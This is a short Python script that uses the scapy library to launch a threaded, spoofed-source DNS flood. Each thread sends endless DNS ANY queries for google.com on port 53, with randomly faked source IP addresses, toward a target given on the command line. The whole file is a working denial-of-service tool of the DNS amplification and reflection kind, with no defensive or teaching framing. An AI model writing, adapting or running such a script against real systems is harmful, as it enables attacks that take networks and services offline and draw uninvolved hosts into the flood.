import threading
from handler import args_handler
from ipgen import fake_ip_gen
from scapy.all import *

def attack(target):
    try:
        while True:
            s_addr = fake_ip_gen()
            ip = IP(src=s_addr, dst=target)
            udp = UDP(dport=53)
            dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname="google.com", qtype=255))
            pkt = ip / udp / dns
            send(pkt)
            
    except Exception as e:
        print(f"An error occurred: {str(e)}")


 
def main():
    target_ip, num_threads = args_handler() 
    
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip,))
        thread.start()

  
if __name__ == '__main__':
    main()
 